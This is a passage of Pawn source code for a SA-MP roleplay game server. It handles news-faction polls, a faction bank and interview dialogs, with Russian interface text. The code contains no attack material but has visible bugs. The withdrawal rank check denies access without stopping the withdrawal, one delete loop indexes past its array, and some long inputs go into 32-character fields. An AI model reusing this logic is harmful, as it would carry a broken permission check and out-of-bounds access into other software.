					if(strlen(string) == 0) return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
					else
					{
						ShowPlayerDialog(playerid, 3136, DIALOG_STYLE_LIST, "Варианты", string, "Выбрать", "Назад");
					}
			    }
			    case 1: // add variant
			    {
			    	return ShowPlayerDialog(playerid, 3133, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите вариант ответа. До 32 символов", "Далее", "Назад");
			    }
			    case 2: // add question
			    {
					return ShowPlayerDialog(playerid, 3132, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите вопрос. До 100 символов", "Далее", "Назад");
			    }
			    case 3: // level limit
			    {
			    	return ShowPlayerDialog(playerid, 3134, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите уровень с которого будет доступно голосование", "Далее", "Назад");
			    }
			    case 4: // launch
			    {
			        
			        new i = GetPVarInt(playerid, "chosen_point_vote");
			        if(PlayerInfo[playerid][pMember] == 9)
					{
						for(new j = 0; j < 10; j++)
				        {
				            if(VoteNews[sfn][j][vactive])
				            {
				                ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
								if(i == j) return SCM(playerid, COLOR_GREY, " Это голосование уже запущено!");
								return SendMes(playerid, COLOR_GREY, " Уже активировано голосование \"%s\". Сперва удалите его",VoteNews[sfn][j][vcaption]);
                			}
				        }
						new index = -1;
						for(new j = 0; j < 10; j++)
						{
							if(strlen(VoteNewsVariants_SF[i][j][vname]) == 0)
							{
								index = j;
								break;
							}
						}
						if(index == 0)
						{
						    ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
							return SCM(playerid, COLOR_GREY, " Вы не добавили ни одного варианта ответа");
						}
						VoteNews[sfn][i][vactive] = 1;
						//SCM(playerid, -1, " Вы запустили голосование!");
						format(string, sizeof(string), " Открыто голосование репортёром %s News SF {FFFFFF}(( используйте /vote ))", Name(playerid));
						OOCNews(TEAM_GROVE_COLOR, string);
					}
					else if(PlayerInfo[playerid][pMember] == 16)
					{
					    for(new j = 0; j < 10; j++)
				        {
				            if(VoteNews[lsn][j][vactive])
				            {
				                ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
                                if(i == j) return SCM(playerid, COLOR_GREY, " Это голосование уже запущено!");
								return SendMes(playerid, COLOR_GREY, " Уже активировано голосование \"%s\". Сперва удалите его",VoteNews[lsn][j][vcaption]);
                			}
				        }
						new index = -1;
						for(new j = 0; j < 10; j++)
						{
							if(strlen(VoteNewsVariants_LS[i][j][vname]) == 0)
							{
								index = j;
								break;
							}
						}
						if(index == 0)
						{
						    ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
							return SCM(playerid, COLOR_GREY, " Вы не добавили ни одного варианта ответа");
						}
						VoteNews[lsn][i][vactive] = 1;
						//SCM(playerid, -1, " Вы запустили голосование!");
						format(string, sizeof(string), " Открыто голосование репортёром %s News LS {FFFFFF}(( используйте /vote ))", Name(playerid));
						LSNews(TEAM_GROVE_COLOR, string);
					}
					else if(PlayerInfo[playerid][pMember] == 20)
					{
					    for(new j = 0; j < 10; j++)
				        {
				            if(VoteNews[lvn][j][vactive])
				            {
				                ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
				                if(i == j) return SCM(playerid, COLOR_GREY, " Это голосование уже запущено!");
								return SendMes(playerid, COLOR_GREY, " Уже активировано голосование \"%s\". Сперва удалите его",VoteNews[lvn][j][vcaption]);
                			}
				        }
						new index = -1;
						for(new j = 0; j < 10; j++)
						{
							if(strlen(VoteNewsVariants_LV[i][j][vname]) == 0)
							{
								index = j;
								break;
							}
						}
						if(index == 0)
						{
						    ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
							return SCM(playerid, COLOR_GREY, " Вы не добавили ни одного варианта ответа");
						}
						VoteNews[lvn][i][vactive] = 1;
						//SCM(playerid, -1, " Вы запустили голосование!");
						format(string, sizeof(string), " Открыто голосование репортёром %s News LV {FFFFFF}(( используйте /vote ))", Name(playerid));
						LVNews(TEAM_GROVE_COLOR, string);
					}
					ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
			    }
			    case 5: // delete
			    {
                    new index = GetPVarInt(playerid, "chosen_point_vote");
                    if(PlayerInfo[playerid][pMember] == 9)
                    {
						new zin = -1;
					    for(new i = index; i < 9; i++)
					    {
					    	strmid(VoteNews[sfn][i][vcaption], VoteNews[sfn][i+1][vcaption], 0, 32, 32);
							strmid(VoteNews[sfn][i][vquestion], VoteNews[sfn][i+1][vquestion], 0, 32, 32);
							VoteNews[sfn][i][vlevel] = VoteNews[sfn][i+1][vlevel];
							VoteNews[sfn][i][vactive] = VoteNews[sfn][i+1][vactive];
							for(new j = 0; j < 10; j++)
							{
								strmid(VoteNewsVariants_SF[i][j][vname], VoteNewsVariants_SF[i+1][j][vname], 0, 32, 32);
								VoteNewsVariants_SF[i][j][vnumber] = VoteNewsVariants_SF[i+1][j][vnumber];
							}
							if(strlen(VoteNews[sfn][i+1][vcaption]) == 0) zin = i+1;
					    }
					    if(zin == -1) zin = 9;
				        format(VoteNews[sfn][zin][vcaption], 32, "");
						format(VoteNews[sfn][zin][vquestion],32, "");
						VoteNews[sfn][zin][vlevel] = 1;
						VoteNews[sfn][zin][vactive] = 0;
						for(new j = 0; j < 10; j++)
						{
							format(VoteNewsVariants_SF[zin][j][vname], 32, "");
							VoteNewsVariants_SF[zin][j][vnumber] = 0;
						}
                    }
                    else if(PlayerInfo[playerid][pMember] == 16)
                    {
                    	new zin = -1;
					    for(new i = index; i < 9; i++)
					    {
					    	strmid(VoteNews[lsn][i][vcaption], VoteNews[lsn][i+1][vcaption], 0, 32, 32);
							strmid(VoteNews[lsn][i][vquestion], VoteNews[lsn][i+1][vquestion], 0, 32, 32);
							VoteNews[lsn][i][vlevel] = VoteNews[lsn][i+1][vlevel];
							VoteNews[lsn][i][vactive] = VoteNews[lsn][i+1][vactive];
							for(new j = 0; j < 10; j++)
							{
								strmid(VoteNewsVariants_LS[i][j][vname], VoteNewsVariants_LS[i+1][j][vname], 0, 32, 32);
								VoteNewsVariants_LS[i][j][vnumber] = VoteNewsVariants_LS[i+1][j][vnumber];
							}
							if(strlen(VoteNews[lsn][i+1][vcaption]) == 0) zin = i+1;
					    }
					    if(zin == -1) zin = 9;
				        format(VoteNews[lsn][zin][vcaption], 32, "");
						format(VoteNews[lsn][zin][vquestion],32, "");
						VoteNews[lsn][zin][vlevel] = 1;
						VoteNews[lsn][zin][vactive] = 0;
						for(new j = 0; j < 10; j++)
						{
							format(VoteNewsVariants_LS[zin][j][vname], 32, "");
							VoteNewsVariants_LS[zin][j][vnumber] = 0;
						}
                    }
                    else if(PlayerInfo[playerid][pMember] == 20)
                    {
                    	new zin = -1;
					    for(new i = index; i < 10; i++)
					    {
					    	strmid(VoteNews[lvn][i][vcaption], VoteNews[lvn][i+1][vcaption], 0, 32, 32);
							strmid(VoteNews[lvn][i][vquestion], VoteNews[lvn][i+1][vquestion], 0, 32, 32);
							VoteNews[lvn][i][vlevel] = VoteNews[lvn][i+1][vlevel];
							VoteNews[lvn][i][vactive] = VoteNews[lvn][i+1][vactive];
							for(new j = 0; j < 10; j++)
							{
								strmid(VoteNewsVariants_LV[i][j][vname], VoteNewsVariants_LV[i+1][j][vname], 0, 32, 32);
								VoteNewsVariants_LV[i][j][vnumber] = VoteNewsVariants_LV[i+1][j][vnumber];
							}
							if(strlen(VoteNews[lsn][i+1][vcaption]) == 0) zin = i+1;
					    }
					    if(zin == -1) zin = 9;
				        format(VoteNews[lvn][zin][vcaption], 32, "");
						format(VoteNews[lvn][zin][vquestion],32, "");
						VoteNews[lvn][zin][vlevel] = 1;
						VoteNews[lvn][zin][vactive] = 0;
						for(new j = 0; j < 10; j++)
						{
							format(VoteNewsVariants_LV[zin][j][vname], 32, "");
							VoteNewsVariants_LV[zin][j][vnumber] = 0;
						}
                    }
                    
                    
	      			new firstfree = -1;
					if(PlayerInfo[playerid][pMember] == 9)
					{
					    for(new i = 0; i < 10; i++)
					    {
					    	if(!strlen(VoteNews[sfn][i][vcaption]))
					    	{
					    	    firstfree = i;
					    	    break;
					    	}
				    	}
			    	}
			    	else if(PlayerInfo[playerid][pMember] == 16)
					{
					    for(new i = 0; i < 10; i++)
					    {
					    	if(!strlen(VoteNews[lsn][i][vcaption]))
					    	{
					    	    firstfree = i;
					    	    break;
					    	}
				    	}
			    	}
			    	else if(PlayerInfo[playerid][pMember] == 20)
					{
					    for(new i = 0; i < 10; i++)
					    {
					    	if(!strlen(VoteNews[lvn][i][vcaption]))
					    	{
					    	    firstfree = i;
					    	    break;
					    	}
				    	}
			    	}
			    	if(firstfree == 0)
			    	{
			    		return ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
			    	}
			    	else
			    	{
			    	    format(string, sizeof(string), "");
			    	    new strs[32];
						if(PlayerInfo[playerid][pMember] == 9)
						{
				    	    for(new i = 0; i < 10; i++)
						    {
						    	if(strlen(VoteNews[sfn][i][vcaption]))
						    	{
						    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[sfn][i][vcaption]);
						    		strcat(string, strs);
						    	}
					    	}
				    	}
				    	else if(PlayerInfo[playerid][pMember] == 16)
						{
				    	    for(new i = 0; i < 10; i++)
						    {
						    	if(strlen(VoteNews[lsn][i][vcaption]))
						    	{
						    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[lsn][i][vcaption]);
						    		strcat(string, strs);
						    	}
					    	}
				    	}
				    	else if(PlayerInfo[playerid][pMember] == 20)
						{
				    	    for(new i = 0; i < 10; i++)
						    {
						    	if(strlen(VoteNews[lvn][i][vcaption]))
						    	{
						    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[lvn][i][vcaption]);
						    		strcat(string, strs);
						    	}
					    	}
				    	}
				    	ShowPlayerDialog(playerid, 3130, DIALOG_STYLE_LIST, "Голосование",string, "Выбрать", "Назад");
	      			}
      			}
   			}
	   	}
	case 3137:
	    {
	        if(!response) return true;
	        if(gNews[playerid] == 0)
	        {
	            new index = -1;
	            for(new i = 0; i < 10; i++)
	            {
	                if(VoteNews[sfn][i][vactive] == 1)
	                {
	                    index = i;
	                    break;
	                }
	            }
	            format(string, sizeof(string), "");
	            new strs[32], counter;
	            for(new i = 0; i < 10; i++)
	            {
	                if(strlen(VoteNewsVariants_SF[index][i][vname]) != 0)
	                {
		                format(strs, sizeof(strs), "[%i] %s\n", counter, VoteNewsVariants_SF[index][i][vname]);
		                counter++;
		                strcat(string, strs);
					}
	            }
	            ShowPlayerDialog(playerid, 3135, DIALOG_STYLE_LIST, VoteNews[sfn][index][vcaption], string, "Выбор", "Отмена");
	        }
	        else if(lNews[playerid] == 0)
	        {
	            new index = -1;
	            for(new i = 0; i < 10; i++)
	            {
	                if(VoteNews[lsn][i][vactive] == 1)
	                {
	                    index = i;
	                    break;
	                }
	            }
	            format(string, sizeof(string), "");
	            new strs[32], counter;
	            for(new i = 0; i < 10; i++)
	            {
	                if(strlen(VoteNewsVariants_LS[index][i][vname]) != 0)
	                {
		                format(strs, sizeof(strs), "[%i] %s\n", counter, VoteNewsVariants_LS[index][i][vname]);
		                counter++;
		                strcat(string, strs);
	                }
	            }
	            ShowPlayerDialog(playerid, 3135, DIALOG_STYLE_LIST, VoteNews[lsn][index][vcaption], string, "Выбор", "Отмена");
	        }
	        else if(LvNews[playerid] == 0)
	        {
	            new index = -1;
	            for(new i = 0; i < 10; i++)
	            {
	                if(VoteNews[lvn][i][vactive] == 1)
	                {
	                    index = i;
	                    break;
	                }
	            }
	            format(string, sizeof(string), "");
	            new strs[32], counter;
	            for(new i = 0; i < 10; i++)
	            {
	                if(strlen(VoteNewsVariants_LV[index][i][vname]) != 0)
	                {
						format(strs, sizeof(strs), "[%i] %s\n", counter, VoteNewsVariants_LV[index][i][vname]);
		                counter++;
		                strcat(string, strs);
      				}
	            }
	            ShowPlayerDialog(playerid, 3135, DIALOG_STYLE_LIST, VoteNews[lvn][index][vcaption], string, "Выбор", "Отмена");
	        }
	    }
	case 3135:
	    {
	        if(!response) return true;
	        new voteid = -1;
   			if(gNews[playerid] == 0)
			{
       			if(GetPVarInt(playerid, "progolos_sf"))
			    {
			        return SCM(playerid, COLOR_GREY, " Вы уже голосовали!");
			        //CallLocalFunction("OnPlayerCommandText", "is", playerid, "/vote");
			        //return true;
			    }
				for(new i = 0; i < 10; i++)
			    {
			        if(VoteNews[sfn][i][vactive] == 1)
			        {
						voteid = i;
						break;
			        }
			    }
				new counter = 0, strs[32];
				format(string, sizeof(string), "");
			    for(new i = 0; i < 10; i++)
			    {
					if(strlen(VoteNewsVariants_SF[voteid][i][vname]) != 0)
			        {
						format(strs, sizeof(strs), "[%i] %s", counter, VoteNewsVariants_SF[voteid][i][vname]);
						counter++;
			        }
			    }
			    counter--;
				if(listitem == counter)
				{
				    VoteNewsVariants_SF[voteid][9][vnumber]++;
				}
				else
				{
					VoteNewsVariants_SF[voteid][listitem][vnumber]++;
				}
				SCM(playerid, -1, " Спасибо, ваш голос учтён!");
				SetPVarInt(playerid, "progolos_sf", 1);
			}
			else if(lNews[playerid] == 0)
			{
			    if(GetPVarInt(playerid, "progolos_ls"))
			    {
			        return SCM(playerid, COLOR_GREY, " Вы уже голосовали!");
			        //CallLocalFunction("OnPlayerCommandText", "is", playerid, "/vote");
			        //return true;
			    }
				for(new i = 0; i < 10; i++)
			    {
			        if(VoteNews[lsn][i][vactive] == 1)
			        {
						voteid = i;
						break;
			        }
			    }
				new counter = 0, strs[32];
				format(string, sizeof(string), "");
			    for(new i = 0; i < 10; i++)
			    {
					if(strlen(VoteNewsVariants_LS[voteid][i][vname]) != 0)
			        {
						format(strs, sizeof(strs), "[%i] %s", counter, VoteNewsVariants_LS[voteid][i][vname]);
						counter++;
			        }
			    }
			    counter--;
				if(listitem == counter)
				{
				    VoteNewsVariants_LS[voteid][9][vnumber]++;
				}
				else
				{
					VoteNewsVariants_LS[voteid][listitem][vnumber]++;
				}
				SCM(playerid, -1, " Спасибо, ваш голос учтён!");
				SetPVarInt(playerid, "progolos_ls", 1);
			}
			else if(LvNews[playerid] == 0)
			{
			    if(GetPVarInt(playerid, "progolos_lv"))
			    {
			        return SCM(playerid, COLOR_GREY, " Вы уже голосовали!");
			        //CallLocalFunction("OnPlayerCommandText", "is", playerid, "/vote");
			        //return true;
			    }
			    for(new i = 0; i < 10; i++)
			    {
			        if(VoteNews[lvn][i][vactive] == 1)
			        {
						voteid = i;
						break;
			        }
			    }
				new counter = 0, strs[32];
				format(string, sizeof(string), "");
			    for(new i = 0; i < 10; i++)
			    {
					if(strlen(VoteNewsVariants_LV[voteid][i][vname]) != 0)
			        {
						format(strs, sizeof(strs), "[%i] %s", counter, VoteNewsVariants_LV[voteid][i][vname]);
						counter++;
			        }
			    }
			    counter--;
				if(listitem == counter)
				{
				    VoteNewsVariants_LV[voteid][9][vnumber]++;
				}
				else
				{
					VoteNewsVariants_LV[voteid][listitem][vnumber]++;
				}
				SCM(playerid, -1, " Спасибо, ваш голос учтён!");
				SetPVarInt(playerid, "progolos_lv", 1);
			}
	    }
	case 3134:
	    {
	    	if(!response) return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
			new l = strval(inputtext);
			if(l < 0 || l > 100) return ShowPlayerDialog(playerid, 3134, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите уровень с которого будет доступно голосование", "Далее", "Назад");
			new i = GetPVarInt(playerid, "chosen_point_vote");
			switch(PlayerInfo[playerid][pMember])
			{
			    case 9: VoteNews[sfn][i][vlevel] = l;
			    case 16: VoteNews[lsn][i][vlevel] = l;
			    case 20: VoteNews[lvn][i][vlevel] = l;
   			}
   			SCM(playerid, -1, " Вы установили минимальный уровень для голосования");
   			return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
		}
	case 3133:
	    {
	        if(!response) return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
	        if(strlen(inputtext) < 1 || strlen(inputtext) > 100) return ShowPlayerDialog(playerid, 3133, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите вариант ответа. До 32 символов", "Далее", "Назад");
			new i = GetPVarInt(playerid, "chosen_point_vote");
			if(PlayerInfo[playerid][pMember] == 9)
			{
				for(new j = 0; j < 10; j++)
				{
				    if(strlen(VoteNewsVariants_SF[i][j][vname]) == 0)
				    {
				        strmid(VoteNewsVariants_SF[i][j][vname], inputtext, 0, strlen(inputtext), 32);
				        SCM(playerid, -1, " Вы добавили вариант для голосования");
				        strmid(VoteNewsVariants_SF[i][9][vname], "Воздержаться", 0, 32, 32);
				        break;
				    }
				    if(j == 8) SCM(playerid, COLOR_GREY, " Достигнуто максимальное количество вариантов!");
				}
			}
			else if(PlayerInfo[playerid][pMember] == 16)
			{
				for(new j = 0; j < 10; j++)
				{
				    if(strlen(VoteNewsVariants_LS[i][j][vname]) == 0)
				    {
				        strmid(VoteNewsVariants_LS[i][j][vname], inputtext, 0, strlen(inputtext), 32);
				        SCM(playerid, -1, " Вы добавили вариант для голосования");
				        strmid(VoteNewsVariants_LS[i][9][vname], "Воздержаться", 0, 32, 32);
				        break;
				    }
				    if(j == 8) SCM(playerid, COLOR_GREY, " Достигнуто максимальное количество вариантов!");
				}
			}
			else if(PlayerInfo[playerid][pMember] == 20)
			{
				for(new j = 0; j < 10; j++)
				{
				    if(strlen(VoteNewsVariants_LV[i][j][vname]) == 0)
				    {
				        strmid(VoteNewsVariants_LV[i][j][vname], inputtext, 0, strlen(inputtext), 32);
				        SCM(playerid, -1, " Вы добавили вариант для голосования");
				        strmid(VoteNewsVariants_LV[i][9][vname], "Воздержаться", 0, 32, 32);
				        break;
				    }
				    if(j == 8) SCM(playerid, COLOR_GREY, " Достигнуто максимальное количество вариантов!");
				}
			}
			return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
		}
	case 3132:
	    {
	        if(!response) return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
	        if(strlen(inputtext) < 1 || strlen(inputtext) > 100) return ShowPlayerDialog(playerid, 3132, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите вопрос. До 100 символов", "Далее", "Назад");
			new i = GetPVarInt(playerid, "chosen_point_vote");
			switch(PlayerInfo[playerid][pMember])
			{
			    case 9: strmid(VoteNews[sfn][i][vquestion], inputtext, 0, strlen(inputtext), 100);
			    case 16: strmid(VoteNews[lsn][i][vquestion], inputtext, 0, strlen(inputtext), 100);
			    case 20: strmid(VoteNews[lvn][i][vquestion], inputtext, 0, strlen(inputtext), 100);
   			}
   			SCM(playerid, -1, " Вы добавили вопрос для голосования");
			return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
	    }
	case 3115:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
	        switch(listitem)
	        {
	            case 2:
	            {
					new strs[32];
				    switch(PlayerInfo[playerid][pMember])
				    {
				    	case 9: strs = "SF News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fSfnews]);
				    	case 16: strs = "LS News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fLsnews]);
						case 20: strs = "LV News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fLvnews]);
				    }
					return ShowPlayerDialog(playerid, 3115, DIALOG_STYLE_LIST, strs, string, "Далее", "Назад");
	            }
	            case 1:
	            {
	            	return ShowPlayerDialog(playerid, 3116, DIALOG_STYLE_INPUT, "Перевести на счёт", "Введите сумму, которую вы хотите положить", "Далее", "Назад");
	            }
	            case 0:
	            {
	            	return ShowPlayerDialog(playerid, 3117, DIALOG_STYLE_INPUT, "Сеять со счёта", "Введите сумму, которую вы хотите снять", "Далее", "Назад");
	            }
	        }
		}
	case 3117:
	    {
	        if(!response)
	        {
	        	new strs[32];
			    switch(PlayerInfo[playerid][pMember])
			    {
			    	case 9: strs = "SF News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fSfnews]);
			    	case 16: strs = "LS News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fLsnews]);
					case 20: strs = "LV News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fLvnews]);
			    }
				ShowPlayerDialog(playerid, 3115, DIALOG_STYLE_LIST, strs, string, "Далее", "Назад");
	        }
	        if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, 3117, DIALOG_STYLE_INPUT, "Снять со счёт", "Введите сумму, которую вы хотите снять", "Далее", "Назад");
			new money = strval(inputtext);
			if(money < 1) return ShowPlayerDialog(playerid, 3117, DIALOG_STYLE_INPUT, "Снять со счёта", "Введите сумму, которую вы хотите снять", "Далее", "Назад");
			switch(PlayerInfo[playerid][pMember])
			{
			    case 9:
			    {
			        if((snyatosf+money) > 100000)
			        {
			            return ShowPlayerDialog(playerid, 3117, DIALOG_STYLE_INPUT, "Снять со счёта", "Введите сумму, которую вы хотите снять\nВ день нельзя снимать больше 100 000", "Далее", "Назад");
			        }
			        else
			        {
			            if(PlayerInfo[playerid][pRank] < 10)
						{
						    SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
							CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
						}
			            snyatosf += money;
			            FracBank[0][fSfnews] -= money;
			            PlayerInfo[playerid][pBank] += money;
			            SendMes(playerid, COLOR_BLUE, " Вы сняли со счёта банка SFN %i вирт. Ваш баланс: %i", money, PlayerInfo[playerid][pBank]);
			            format(string, sizeof(string), "[0] Баланс новостей: %i вирт\n[1] Положить деньги\n[2] Снять деньги", FracBank[0][fSfnews]);
			            return ShowPlayerDialog(playerid, 3115, DIALOG_STYLE_LIST, "Снять со счёта", string, "Далее", "Назад");
			        }
			    }
			    case 16:
			    {
			    	if((snyatols+money) > 100000)
			        {
			            return ShowPlayerDialog(playerid, 3117, DIALOG_STYLE_INPUT, "Снять со счёта", "Введите сумму, которую вы хотите снять\nВ день нельзя снимать больше 100 000", "Далее", "Назад");
			        }
			        else
			        {
			            if(PlayerInfo[playerid][pRank] < 10)
						{
						    SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
							CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
						}
			            snyatols += money;
			            FracBank[0][fLsnews] -= money;
			            PlayerInfo[playerid][pBank] += money;
			            SendMes(playerid, COLOR_BLUE, " Вы сняли со счёта банка LSN %i вирт. Ваш баланс: %i", money, PlayerInfo[playerid][pBank]);
			            format(string, sizeof(string), "[0] Баланс новостей: %i вирт\n[1] Положить деньги\n[2] Снять деньги", FracBank[0][fLsnews]);
			            return ShowPlayerDialog(playerid, 3115, DIALOG_STYLE_LIST, "Снять со счёта", string, "Далее", "Назад");
			        }
			    }
			    case 20:
			    {
			    	if((snyatolv+money) > 100000)
			        {
			            return ShowPlayerDialog(playerid, 3117, DIALOG_STYLE_INPUT, "Снять со счёта", "Введите сумму, которую вы хотите снять\nВ день нельзя снимать больше 100 000", "Далее", "Назад");
			        }
			        else
			        {
			            if(PlayerInfo[playerid][pRank] < 10)
						{
						    SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
							CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
						}
			            snyatolv += money;
			            FracBank[0][fLvnews] -= money;
			            PlayerInfo[playerid][pBank] += money;
			            SendMes(playerid, COLOR_BLUE, " Вы сняли со счёта банка LVN %i вирт. Ваш баланс: %i", money, PlayerInfo[playerid][pBank]);
			            format(string, sizeof(string), "[0] Баланс новостей: %i вирт\n[1] Положить деньги\n[2] Снять деньги", FracBank[0][fLvnews]);
			            return ShowPlayerDialog(playerid, 3115, DIALOG_STYLE_LIST, "Снять со счёта", string, "Далее", "Назад");
			        }
			    }
			}
	    }
	case 3116:
	    {
	    	if(!response)
	        {
	        	new strs[32];
			    switch(PlayerInfo[playerid][pMember])
			    {
			    	case 9: strs = "SF News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fSfnews]);
			    	case 16: strs = "LS News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fLsnews]);
					case 20: strs = "LV News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fLvnews]);
			    }
				return ShowPlayerDialog(playerid, 3115, DIALOG_STYLE_LIST, strs, string, "Далее", "Назад");
	        }
			if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, 3116, DIALOG_STYLE_INPUT, "Положить на счёт", "Введите сумму, которую вы хотите положить", "Далее", "Назад");
			new money = strval(inputtext);
			if(money < 1) return ShowPlayerDialog(playerid, 3116, DIALOG_STYLE_INPUT, "Положить на счёт", "Введите сумму, которую вы хотите положить", "Далее", "Назад");
			if(money > PlayerInfo[playerid][pBank])
			{
			    SCM(playerid, COLOR_GREY, " У вас нет столько денег на банковском счету!");
			    return ShowPlayerDialog(playerid, 3116, DIALOG_STYLE_INPUT, "Положить на счёт", "Введите сумму, которую вы хотите положить", "Далее", "Назад");
			}
			switch(PlayerInfo[playerid][pMember])
			{
			    case 9: FracBank[0][fSfnews] += money;
			    case 16: FracBank[0][fLsnews] += money;
			    case 20: FracBank[0][fLvnews] += money;
			}
			PlayerInfo[playerid][pBank] -= money;
	    }
	case 2230:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
	        if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, 2230, DIALOG_STYLE_INPUT, "Взять интервью", "Введите ид игрока для начала интервью", "Далее", "Назад");
			new plid = strval(inputtext);
			if(!IsPlayerConnected(plid) || plid == INVALID_PLAYER_ID)
			{
			    SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
			    ShowPlayerDialog(playerid, 2230, DIALOG_STYLE_INPUT, "Взять интервью", "Введите ид игрока для начала интервью", "Далее", "Назад");
				return true;
			}
			if(GetDistanceBetweenPlayerss(playerid, plid) > 5)
		 	{
			 	SCM(playerid, COLOR_GREY, " Игрок слишком далеко!");
			 	ShowPlayerDialog(playerid, 2230, DIALOG_STYLE_INPUT, "Взять интервью", "Введите ид игрока для начала интервью", "Далее", "Назад");
				return true;
		 	}
		 	switch(PlayerInfo[playerid][pMember])
		 	{
		 	    case 9: TalkingLive[plid] = 2;
		 	    case 16:TalkingLivels[plid] = 2;
		 	    case 20:TalkingLivelv[plid] = 2;
    		}
    		SCM(playerid, -1, " Он вошёл в прямой эфир");
    		SCM(plid, -1, " Вы вошли в прямой эфир");
    		CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
    		return true;
		}
	case 2231:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
			if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, 2231, DIALOG_STYLE_INPUT, "Завершить интервью", "Введите ид игрока для завершения интвервью", "Далее", "Назад");
